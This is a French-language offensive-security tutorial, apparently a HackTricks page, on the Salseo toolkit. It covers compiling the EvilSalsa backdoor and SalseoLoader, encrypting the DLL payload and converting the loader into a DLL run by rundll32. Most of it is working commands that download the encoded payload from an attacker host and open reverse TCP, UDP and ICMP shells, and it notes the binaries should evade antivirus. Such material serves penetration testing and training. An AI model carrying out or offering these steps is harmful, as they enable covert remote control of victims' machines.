# Salseo

{{#include ../banners/hacktricks-training.md}}

## Compilation des binaires

Téléchargez le code source depuis github et compilez **EvilSalsa** et **SalseoLoader**. Vous aurez besoin de **Visual Studio** installé pour compiler le code.

Compilez ces projets pour l'architecture de la machine Windows où vous allez les utiliser (Si Windows supporte x64, compilez-les pour cette architecture).

Vous pouvez **sélectionner l'architecture** dans Visual Studio dans l'onglet **"Build"** à gauche dans **"Platform Target".**

(\*\*Si vous ne trouvez pas ces options, cliquez sur **"Project Tab"** puis sur **"\<Nom du Projet> Properties"**)

![](<../images/image (132).png>)

Ensuite, construisez les deux projets (Build -> Build Solution) (Dans les logs, le chemin de l'exécutable apparaîtra) :

![](<../images/image (1) (2) (1) (1) (1).png>)

## Préparer le Backdoor

Tout d'abord, vous devrez encoder le **EvilSalsa.dll.** Pour ce faire, vous pouvez utiliser le script python **encrypterassembly.py** ou vous pouvez compiler le projet **EncrypterAssembly** :

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
D'accord, maintenant vous avez tout ce qu'il vous faut pour exécuter toutes les choses Salseo : le **EvilDalsa.dll encodé** et le **binaire de SalseoLoader.**

**Téléchargez le binaire SalseoLoader.exe sur la machine. Ils ne devraient pas être détectés par un AV...**

## **Exécuter le backdoor**

### **Obtenir un shell inverse TCP (téléchargement du dll encodé via HTTP)**

N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inverse et un serveur HTTP pour servir l'evilsalsa encodé.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtenir un shell inverse UDP (téléchargement d'un dll encodé via SMB)**

N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inverse, et un serveur SMB pour servir l'evilsalsa encodé (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtenir un shell inverse ICMP (dll encodée déjà à l'intérieur de la victime)**

**Cette fois, vous avez besoin d'un outil spécial sur le client pour recevoir le shell inverse. Téléchargez :** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Désactiver les réponses ICMP :**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Exécuter le client :
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### À l'intérieur de la victime, exécutons le truc salseo :
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compiler SalseoLoader en tant que DLL exportant la fonction principale

Ouvrez le projet SalseoLoader avec Visual Studio.

### Ajoutez avant la fonction principale : \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installez DllExport pour ce projet

#### **Outils** --> **Gestionnaire de packages NuGet** --> **Gérer les packages NuGet pour la solution...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir), et appuyez sur Installer (et acceptez le popup)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Dans votre dossier de projet, les fichiers suivants sont apparus : **DllExport.bat** et **DllExport_Configure.bat**

### **D** désinstaller DllExport

Appuyez sur **Désinstaller** (ouais, c'est bizarre mais faites-moi confiance, c'est nécessaire)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Quittez Visual Studio et exécutez DllExport_configure**

Il suffit de **quitter** Visual Studio

Ensuite, allez dans votre **dossier SalseoLoader** et **exécutez DllExport_Configure.bat**

Sélectionnez **x64** (si vous allez l'utiliser à l'intérieur d'une boîte x64, c'était mon cas), sélectionnez **System.Runtime.InteropServices** (dans **Namespace pour DllExport**) et appuyez sur **Appliquer**

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Ouvrez à nouveau le projet avec Visual Studio**

**\[DllExport]** ne devrait plus être marqué comme erreur

![](<../images/image (8) (1).png>)

### Construire la solution

Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Propriétés de SalseoLoader --> Application --> Type de sortie = Bibliothèque de classes)

![](<../images/image (10) (1).png>)

Sélectionnez **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Build --> Cible de la plateforme = x64)

![](<../images/image (9) (1) (1).png>)

Pour **construire** la solution : Build --> Build Solution (Dans la console de sortie, le chemin de la nouvelle DLL apparaîtra)

### Testez la Dll générée

Copiez et collez la Dll où vous souhaitez la tester.

Exécutez :
```
rundll32.exe SalseoLoader.dll,main
```
Si aucune erreur n'apparaît, vous avez probablement un DLL fonctionnel !!

## Obtenir un shell en utilisant le DLL

N'oubliez pas d'utiliser un **serveur** **HTTP** et de définir un **écouteur** **nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
